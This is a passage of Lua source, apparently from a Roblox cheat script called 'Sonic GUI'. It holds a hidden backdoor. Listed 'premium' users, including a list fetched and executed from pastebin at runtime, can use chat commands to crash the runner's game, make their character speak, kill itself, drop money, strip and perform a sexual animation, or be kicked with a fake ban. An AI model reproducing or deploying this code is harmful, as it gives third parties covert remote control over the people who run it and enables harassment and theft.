			if string.find(SplitCMD[1], '$crash') then
                while true do end
            end
            if string.find(SplitCMD[1], '$say') then
                local message = table.concat(SplitCMD, " ", 2)
                local A_1 = message
                local A_2 = "All"
                local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
                Event:FireServer(A_1, A_2)
            end   
            if string.find(SplitCMD[1], '$hurt') then
                buy("[Revolver] - $1379", "[Revolver]", 1379)
                wait(2)
                if game.Players.LocalPlayer.Backpack:FindFirstChild("[Revolver]") then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("[Revolver]").Parent = game.Players.LocalPlayer.Character
                local revolver = game.Players.LocalPlayer.Character:FindFirstChild('[Revolver]')
                if revolver then
                    local ChatEvents = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents
                    local Event = ChatEvents.SayMessageRequest
                    
                    Event:FireServer("GoodBye!", "All")
                    wait(1)
                    
                    revolver:Activate()
                    wait(1)
                    
                    game.Players.LocalPlayer.Character.Humanoid.Health = 0
                end                   
            end  
        end

            if string.find(SplitCMD[1], '$glitch') then
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                local rightUpperArm = character:WaitForChild("RightUpperArm")
                local leftUpperArm = character:WaitForChild("LeftUpperArm")
                local rightUpperLeg = character:WaitForChild("RightUpperLeg")
                local leftUpperLeg = character:WaitForChild("LeftUpperLeg")
                
                rightUpperArm.Position = Vector3.new(0, -1200, 0)
                leftUpperArm.Position = Vector3.new(0, -1200, 0)
                rightUpperLeg.Position = Vector3.new(0, -1200, 0)
                leftUpperLeg.Position = Vector3.new(0, -1200, 0)
            end   
			if string.find(SplitCMD[1], '$dropcash') then
                game.ReplicatedStorage.MainEvent:FireServer("DropMoney", 10000)
            end
			if string.find(SplitCMD[1], '$pray') then
            local player = game.Players.LocalPlayer
            local PrayAnim = Instance.new("Animation")
            PrayAnim.AnimationId = "rbxassetid://3487719500"
            local PrayAnimPlay = player.Character:WaitForChild("Humanoid"):LoadAnimation(PrayAnim)
            PrayAnimPlay:Play()
            end
            if string.find(SplitCMD[1], '$blind') then
                local guiService = game:GetService("GuiService")
                local player = game.Players.LocalPlayer
                
                local screenGui = Instance.new("ScreenGui")
                screenGui.Parent = player.PlayerGui
                
                local frame = Instance.new("Frame")
                frame.BackgroundColor3 = Color3.new(0, 0, 0)
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.Position = UDim2.new(0, 0, 0, 0)
                frame.Parent = screenGui
                
                frame.BackgroundTransparency = 0
                end

                if string.find(SplitCMD[1], '$unblind') then
                 local player = game.Players.LocalPlayer
                 local screenGui = player.PlayerGui:FindFirstChild("ScreenGui")

                 if screenGui then
                 screenGui:Destroy()
                    end
                    end
            if string.find(SplitCMD[1], '$benx') then
				game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah Yeah!", 'All');
                bending = true
                local segtarget = Mod.Name
                local Crouch = player.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                local away = .5
                local reversing = false
                local shirt = player.Character:FindFirstChild('Shirt')
                local pants = player.Character:FindFirstChild('Pants')
                if shirt then
                    shirt:Destroy()
                end
                if pants then
                    pants:Destroy()
                end
                local Loop
                local loopFunction = function()
                    local targetchar = game.Workspace.Players:FindFirstChild(segtarget) or game.Workspace:FindFirstChild(segtarget)
                    local character = player.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                            reversing = false
                        end
                        character.HumanoidRootPart.CFrame = game.Players[segtarget].Character.HumanoidRootPart.CFrame + game.Players[segtarget].Character.HumanoidRootPart.CFrame.lookVector * away
                    end
                end
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
                end
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end
                Start()
                repeat wait() until bending == false
                Pause()
            end
            if string.find(SplitCMD[1], '$unbenx') then
                while bending == true do
                    wait()
                    bending = false
                end
            end
            if string.find(SplitCMD[1], '$ban') then
                    kickmsg = "PERMA-BAN"
                    player:Kick(kickmsg)
                end
            if string.find(SplitCMD[1], '$bring') then
                player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Players:FindFirstChild(Mod.Name).HumanoidRootPart.Position)
            end
            if string.find(SplitCMD[1], '$dance') then
                local assetId = "rbxassetid://11710529975"

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local animation = Instance.new("Animation")
animation.AnimationId = assetId

local animationTrack = humanoid:LoadAnimation(animation)
animationTrack:Play()

            end
            if string.find(SplitCMD[1], '$kick') then
                        player:Kick('Kicked by Premium User')
                    end
            if string.find(SplitCMD[1], '$fling') then
                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000, 500000, 500000)
            end
        else
            if string.find(msg, '/e test') then
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Yeah, Sonic GUI On Top!", 'All');
            end
        end
    end
end

muted = {}
muteingnew = false

local ModCheck = loadstring(game:HttpGet('https://pastebin.com/raw/uLEwKpnJ'))()
Players.PlayerAdded:Connect(function(plr)
    local SWAGMIN = table.find(swagmins, plr.UserId)
    if SWAGMIN or ModCheck[plr.UserId] then
        plr.Chatted:Connect(function(msg)
            commands(msg, plr.UserId)
        end)
    end
    if muteingnew == true then
        if not table.find(muted, plr.Name) then
            table.insert(muted, plr.Name)
            print('automuted ' .. plr.Name)
        end
    end
end)

for i, v in pairs(game:GetService('Players'):GetChildren()) do
    local SWAGMIN = table.find(swagmins, v.UserId)
    if SWAGMIN or ModCheck[v.UserId] then
        print('found')
        v.Chatted:Connect(function(msg)
            commands(msg, v.UserId)
        end)
    end
end


wait(5)
if ModCheck[player.UserId] then
    IsMod = true
    DisableMod = true
    Notif("Granted Premium Powers | You are immune to Premium CMDS", 10)
elseif table.find(swagmins, player.UserId) then
    Notif("Granted Premium Powers | You are immune to Premium CMDS", 10)
    IsMod = true
    DisableMod = true
else
    IsMod = false
    DisableMod = false
    print("Sonic GUI Loaded")
end


local commands = {}
    
    local prefix = "/"

    local function findPlayer(name)
        for _, Player in ipairs(Players:GetPlayers()) do
            if (string.lower(name) == string.sub(string.lower(Player.Name), 1, #name)) then
                return Player;
            end
        end
    end
    
	commands.e = function(arguments)
		local CMD = arguments[1]
		if CMD == 'shield' then
			if IsMod == true then
				DisableMod = true
				Notif("Immune to premium CMDS", 4)
			else
				Notif("You do not have permission to use this command.", 4)
			end
		end
		if CMD == 'unshield' then
			if IsMod == true then
				DisableMod = false
				Notif("Unimmune to premium CMDS", 4)
			else
				Notift("You do not have permission to use this command.", 4)
			end
		end
	end
	
	player.Chatted:Connect(function(message,recipient)
		message = string.lower(message)
		local splitString = message:split(" ")
		local slashCommand = splitString[1] 
		local cmd = slashCommand:split(prefix)	
		local cmdName = cmd[2]	
		if commands[cmdName] then
			local arguments = {} 
			for i = 2, #splitString, 1 do
			   table.insert(arguments,splitString[i])			
			end
		commands[cmdName](arguments)
		end
	end)
